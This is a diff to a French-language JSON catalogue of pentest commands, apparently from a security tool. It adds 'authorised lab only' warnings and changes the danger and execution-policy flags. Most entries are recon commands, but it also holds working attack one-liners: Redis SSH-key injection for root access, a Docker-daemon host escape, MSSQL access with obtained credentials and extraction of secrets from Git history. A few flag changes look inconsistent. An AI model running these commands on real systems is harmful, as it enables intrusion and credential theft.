@@ -217,13 +217,13 @@
       "command": "theHarvester -d $DOMAIN -b duckduckgo,crtsh,hackertarget,rapiddns -l 200",
       "purpose": "Trouver des adresses email d'employés, sous-domaines exposés et IPs associées à une organisation.",
       "expected_output": "Emails, sous-domaines, hôtes, IPs découverts via OSINT",
-      "risks": "Requiert des API keys pour certaines sources. Résultats limités sans clés.",
+      "risks": "Requiert des API keys pour certaines sources. Résultats limités sans clés — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "theHarvester installé (pipx install git+https://github.com/laramies/theHarvester.git)"
       ],
       "tool_required": "theHarvester",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -233,7 +233,8 @@
         "theharvester",
         "duckduckgo",
         "crtsh"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_010",
@@ -296,13 +297,13 @@
       "command": "sublist3r -d $DOMAIN -o subdomains.txt",
       "purpose": "Découvrir la surface d'attaque complète d'un domaine : sous-domaines exposés, APIs, panneaux admin.",
       "expected_output": "Fichier subdomains.txt avec tous les sous-domaines découverts",
-      "risks": "Peut être détecté comme bot par certains services. Limites de rate sur les APIs.",
+      "risks": "Peut être détecté comme bot par certains services. Limites de rate sur les APIs — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "sublist3r installé (pip install sublist3r)"
       ],
       "tool_required": "sublist3r",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -311,7 +312,8 @@
         "dns",
         "brute-force",
         "sublist3r"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_013",
@@ -347,13 +349,13 @@
       "command": "amass enum -passive -d $DOMAIN",
       "purpose": "Étendre la cartographie d'un domaine en mode discret grâce à des sources publiques: certificats, moteurs de recherche et APIs.",
       "expected_output": "Liste de sous-domaines trouvés pour le domaine ciblé",
-      "risks": "Faible risque réseau car mode passif, mais peut dépendre d'APIs externes et de quotas.",
+      "risks": "Faible risque réseau car mode passif, mais peut dépendre d'APIs externes et de quotas — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "amass installé"
       ],
       "tool_required": "amass",
-      "safe_to_run": true,
-      "dangerous": false,
+      "safe_to_run": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -362,7 +364,8 @@
         "subdomains",
         "recon",
         "passive"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_015",
@@ -372,14 +375,14 @@
       "command": "smbmap -H $TARGET -u $USER -p $PASS",
       "purpose": "Identifier rapidement les partages SMB lisibles/écrivable sur une cible Windows ou Samba avec des credentials donnés.",
       "expected_output": "Liste des shares avec droits READ/WRITE et chemins associés",
-      "risks": "Connexion authentifiée visible dans les logs SMB. Usage légal uniquement.",
+      "risks": "Connexion authentifiée visible dans les logs SMB. Usage légal uniquement — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "smbmap installé",
         "Credentials valides si accès authentifié"
       ],
       "tool_required": "smbmap",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -388,7 +391,8 @@
         "shares",
         "windows",
         "enumeration"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_016",
@@ -398,14 +402,14 @@
       "command": "kerbrute userenum --dc $TARGET -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
       "purpose": "Valider l'existence d'utilisateurs AD en s'appuyant sur les réponses Kerberos, utile avant password spray ou AS-REP roasting.",
       "expected_output": "Liste des usernames valides trouvés sur le domaine",
-      "risks": "Peut générer des événements d'authentification et être détecté par le SIEM/EDR.",
+      "risks": "Peut générer des événements d'authentification et être détecté par le SIEM/EDR — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "kerbrute installé",
         "DC accessible sur le port 88"
       ],
       "tool_required": "kerbrute",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -414,7 +418,8 @@
         "active-directory",
         "userenum",
         "ad"
-      ]
+      ],
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_017",
@@ -474,15 +479,15 @@
       "command": "subfinder -d $DOMAIN -silent",
       "purpose": "Obtenir rapidement une première liste de sous-domaines sans brute-force actif ni requêtes directes sur la cible.",
       "expected_output": "Liste de sous-domaines passive sur stdout",
-      "risks": "Faible risque: dépend de sources externes et d'éventuelles limites d'API.",
+      "risks": "Faible risque: dépend de sources externes et d'éventuelles limites d'API — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "subfinder installé"
       ],
       "tool_required": "subfinder",
-      "safe_to_run": true,
-      "dangerous": false,
+      "safe_to_run": false,
+      "dangerous": true,
       "requires_sudo": false,
-      "execution_policy": "safe",
+      "execution_policy": "lab_only",
       "category": "recon",
       "tags": [
         "subfinder",
@@ -755,7 +760,7 @@
       "command": "redis-cli -h $TARGET INFO server",
       "purpose": "Vérifier si Redis est accessible sans mot de passe",
       "expected_output": "redis_version, config_file, os: Linux",
-      "risks": "Élevé — Redis sans auth permet lecture/écriture arbitraire, RCE possible",
+      "risks": "Élevé — Redis sans auth permet lecture/écriture arbitraire, RCE possible — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "redis-tools installé",
         "port 6379 ouvert"
@@ -770,7 +775,7 @@
         "noauth",
         "rce"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_031",
@@ -780,7 +785,7 @@
       "command": "redis-cli -h $TARGET config set dir /root/.ssh && redis-cli -h $TARGET config set dbfilename authorized_keys && redis-cli -h $TARGET set pwn \"\\n\\n$(cat ~/.ssh/id_rsa.pub)\\n\\n\" && redis-cli -h $TARGET save",
       "purpose": "Obtenir un accès SSH root via Redis mal configuré (CVE classique)",
       "expected_output": "OK OK OK OK — puis ssh root@$TARGET fonctionne",
-      "risks": "Critique — RCE + persistance root sur la cible",
+      "risks": "Critique — RCE + persistance root sur la cible — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "clé SSH locale générée",
         "Redis accessible sans auth en root"
@@ -796,7 +801,7 @@
         "persistence",
         "root"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_032",
@@ -856,7 +861,7 @@
       "command": "python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py $DOMAIN/$USER:$PASS@$TARGET -windows-auth",
       "purpose": "Accéder à un serveur MSSQL avec des credentials obtenus",
       "expected_output": "SQL> — prompt interactif MSSQL",
-      "risks": "Élevé — accès base de données, xp_cmdshell permet RCE",
+      "risks": "Élevé — accès base de données, xp_cmdshell permet RCE — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "impacket installé",
         "port 1433 ouvert",
@@ -873,7 +878,7 @@
         "impacket",
         "rce"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_035",
@@ -908,13 +913,13 @@
       "command": "nmap -p 2375,2376 --script ssl-cert,docker-version $TARGET",
       "purpose": "Identifier un Docker daemon accessible sans TLS",
       "expected_output": "2375/tcp open docker-api — version: xx",
-      "risks": "Critique — Docker sans TLS = root sur l'hôte",
+      "risks": "Critique — Docker sans TLS = root sur l'hôte — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "nmap installé"
       ],
       "tool_required": "nmap",
       "safe_to_run": false,
-      "dangerous": true,
+      "dangerous": false,
       "requires_sudo": false,
       "tags": [
         "docker",
@@ -922,7 +927,7 @@
         "recon",
         "rce"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_037",
@@ -982,14 +987,14 @@
       "command": "gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50",
       "purpose": "Découvrir des sous-domaines cachés ou oubliés",
       "expected_output": "Found: dev.DOMAIN, Found: staging.DOMAIN",
-      "risks": "Moyen — générer du trafic DNS inhabituel",
+      "risks": "Moyen — générer du trafic DNS inhabituel — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "gobuster installé",
         "SecLists installé"
       ],
       "tool_required": "gobuster",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "tags": [
         "dns",
@@ -997,7 +1002,7 @@
         "bruteforce",
         "recon"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_040",
@@ -1057,7 +1062,7 @@
       "command": "curl -s http://$TARGET:2375/images/json && docker -H tcp://$TARGET:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh",
       "purpose": "Exploiter un Docker daemon sans TLS pour rooter l'hôte",
       "expected_output": "# whoami → root — dans le chroot de l'hôte",
-      "risks": "Critique — accès root complet à l'hôte via escape de conteneur",
+      "risks": "Critique — accès root complet à l'hôte via escape de conteneur — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "Docker daemon sur TCP 2375 sans TLS"
       ],
@@ -1072,7 +1077,7 @@
         "escape",
         "root"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_043",
@@ -1082,14 +1087,14 @@
       "command": "subfinder -d $DOMAIN -all -silent -o subdomains.txt",
       "purpose": "Construire une surface d'attaque initiale sans scanner activement la cible.",
       "expected_output": "Sous-domaines sauvegardés dans subdomains.txt",
-      "risks": "Faible risque, mais dépend de sources externes et peut exposer l'intérêt pour un domaine.",
+      "risks": "Faible risque, mais dépend de sources externes et peut exposer l'intérêt pour un domaine — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "subfinder installé",
         "Domaine autorisé"
       ],
       "tool_required": "subfinder",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -1098,7 +1103,7 @@
         "recon",
         "passive"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_044",
@@ -1108,14 +1113,14 @@
       "command": "httpx -l subdomains.txt -title -tech-detect -status-code -follow-redirects -o httpx.txt",
       "purpose": "Transformer une liste de domaines en endpoints HTTP exploitables et priorisés.",
       "expected_output": "URLs vivantes avec titre, status code et technologies détectées",
-      "risks": "Envoie des requêtes à beaucoup d'hôtes. Peut être visible dans les logs.",
+      "risks": "Envoie des requêtes à beaucoup d'hôtes. Peut être visible dans les logs — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "httpx installé",
         "subdomains.txt disponible"
       ],
       "tool_required": "httpx",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -1125,7 +1130,7 @@
         "recon",
         "technology"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_045",
@@ -1135,14 +1140,14 @@
       "command": "katana -u http://$TARGET -depth 3 -jc -kf all -o katana_urls.txt",
       "purpose": "Découvrir routes, fichiers JS, paramètres et endpoints API depuis une application web.",
       "expected_output": "URLs découvertes sauvegardées dans katana_urls.txt",
-      "risks": "Crawl actif pouvant générer de nombreuses requêtes applicatives.",
+      "risks": "Crawl actif pouvant générer de nombreuses requêtes applicatives — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "katana installé",
         "Application autorisée"
       ],
       "tool_required": "katana",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -1152,7 +1157,7 @@
         "recon",
         "javascript"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "id": "rec_046",
@@ -1169,7 +1174,7 @@
       ],
       "tool_required": "amass",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "requires_sudo": false,
       "category": "recon",
       "tags": [
@@ -1178,7 +1183,7 @@
         "subdomain",
         "recon"
       ],
-      "execution_policy": "normal"
+      "execution_policy": "lab_only"
     },
     {
       "name": "Amass — énumération sous-domaines",
@@ -1214,13 +1219,13 @@
       "command": "subfinder -d $TARGET -o /tmp/subfinder_$TARGET.txt -v",
       "purpose": "Trouver des sous-domaines sans envoyer de requêtes directes — passif et discret.",
       "expected_output": "api.target.com, dev.target.com, mail.target.com",
-      "risks": "Passif — interroge des APIs tierces. Nécessite clés API pour sources premium.",
+      "risks": "Passif — interroge des APIs tierces. Nécessite clés API pour sources premium — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "subfinder installé (go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest)"
       ],
       "tool_required": "subfinder",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "execution_policy": "lab_only",
       "tags": [
         "recon",
@@ -1266,13 +1271,13 @@
       "command": "theHarvester -d $TARGET -b duckduckgo,crtsh,hackertarget,rapiddns -l 500 -f /tmp/harvest_$TARGET",
       "purpose": "Cartographier ressources exposées et adresses email pour recon et phishing ciblé.",
       "expected_output": "Emails: john.doe@target.com; Hosts: mail.target.com [93.184.x.x]",
-      "risks": "Interroge moteurs — peut déclencher CAPTCHAs. Résultats peuvent contenir données personnelles.",
+      "risks": "Interroge moteurs — peut déclencher CAPTCHAs. Résultats peuvent contenir données personnelles — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "theHarvester installé (pipx install git+https://github.com/laramies/theHarvester.git)"
       ],
       "tool_required": "theHarvester",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "execution_policy": "lab_only",
       "tags": [
         "recon",
@@ -1346,7 +1351,7 @@
       "command": "trufflehog git https://github.com/$TARGET --only-verified --json | tee /tmp/trufflehog_$TARGET.json",
       "purpose": "Extraire des credentials exposés dans l'historique Git (clés AWS, tokens GitHub, DB passwords).",
       "expected_output": "JSON avec détecteur, secret, fichier source, commit hash",
-      "risks": "Résultats peuvent contenir des secrets actifs — manipuler avec précaution.",
+      "risks": "Résultats peuvent contenir des secrets actifs — manipuler avec précaution — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "trufflehog installé (pip install trufflehog)"
       ],
@@ -1452,13 +1457,13 @@
       "command": "nmap -sV --script vulners --script-args mincvss=7.0 -p- -T4 $TARGET -oN /tmp/vulners_$TARGET.txt",
       "purpose": "Identifier automatiquement les CVE exploitables basées sur les versions de services.",
       "expected_output": "CVE-2021-41773 9.8 Apache 2.4.49 RCE, CVE-2022-22965 Spring4Shell 9.8",
-      "risks": "Scan complet lent et très bruyant — déclenche IDS/IPS. Ne pas utiliser sur production.",
+      "risks": "Scan complet lent et très bruyant — déclenche IDS/IPS. Ne pas utiliser sur production — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "nmap + script vulners (git clone https://github.com/vulnersCom/nmap-vulners ~/.nmap/scripts/)"
       ],
       "tool_required": "nmap",
       "safe_to_run": false,
-      "dangerous": true,
+      "dangerous": false,
       "execution_policy": "lab_only",
       "tags": [
         "recon",
@@ -1505,13 +1510,13 @@
       "command": "echo $TARGET | waybackurls | tee /tmp/wayback_$TARGET.txt | grep -E '\\.(php|asp|aspx|json|xml|env|bak|sql)'",
       "purpose": "Découvrir des endpoints supprimés, fichiers de config exposés ou paramètres vulnérables dans l'historique.",
       "expected_output": "https://target.com/admin/config.php?id=1, https://target.com/.env.backup",
-      "risks": "Passif — aucun contact avec la cible. Mais résultats peuvent pointer vers ressources sensibles.",
+      "risks": "Passif — aucun contact avec la cible. Mais résultats peuvent pointer vers ressources sensibles — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "waybackurls installé (go install github.com/tomnomnom/waybackurls@latest)"
       ],
       "tool_required": "waybackurls",
       "safe_to_run": false,
-      "dangerous": false,
+      "dangerous": true,
       "execution_policy": "lab_only",
       "tags": [
         "recon",
@@ -1612,7 +1617,7 @@
       "command": "nuclei -u http://$TARGET -t cves/ -t exposures/ -t misconfiguration/ -severity critical,high -o /tmp/nuclei_$TARGET.txt",
       "purpose": "Détection automatisée de CVE et mauvaises configurations via templates YAML communautaires.",
       "expected_output": "[critical] [CVE-2021-44228] http://target.com/ — Log4Shell détecté",
-      "risks": "Lance des payloads réels — peut déclencher des alertes ou impacter l'application.",
+      "risks": "Lance des payloads réels — peut déclencher des alertes ou impacter l'application — à utiliser uniquement en lab autorisé.",
       "prerequisites": [
         "nuclei installé (go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest)",
         "nuclei -update-templates"
@@ -1620,7 +1625,7 @@
       "tool_required": "nuclei",
       "safe_to_run": false,
       "dangerous": true,
-      "execution_policy": "lab_only",
+      "execution_policy": "dry_run_only",
       "tags": [
         "recon",
         "cve",
